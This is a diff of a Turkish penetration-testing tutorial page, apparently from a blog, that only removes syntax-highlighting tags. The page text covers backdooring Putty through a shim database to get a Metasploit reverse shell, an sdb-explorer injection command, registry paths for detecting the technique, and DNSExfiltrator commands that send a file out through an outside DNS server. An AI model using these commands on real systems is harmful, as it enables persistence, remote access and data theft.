@@ -41,7 +41,7 @@
 &lt;p&gt;Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. &lt;/p&gt;
 &lt;h2&gt;Arayüz Olmadan Enjekte Etmek&lt;/h2&gt;
 &lt;p&gt;Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -60,8 +60,8 @@ Uzun cevap:&lt;/p&gt;
 &lt;h2&gt;Tespit etmek&lt;/h2&gt;
 &lt;p&gt;Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde &lt;code&gt;12&lt;/code&gt; event ID ile tetiklenecektir. &lt;/p&gt;
 &lt;p&gt;Registry konumları:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\&lt;/span&gt;
-&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -120,9 +120,9 @@ Nedir DNS'in çalışma mantığı?&lt;/p&gt;
 &lt;p&gt;Server üzerinde 
 &lt;code&gt;dnsexfiltrator.py -d domain -p PAROLA&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Client üzerinde&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;c:\DNSExfiltrator&amp;gt; powershell&lt;/span&gt;
-&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1&lt;/span&gt;
-&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;c:\DNSExfiltrator&amp;gt; powershell
+PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1
+PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
 &lt;/pre&gt;&lt;/div&gt;
 
 
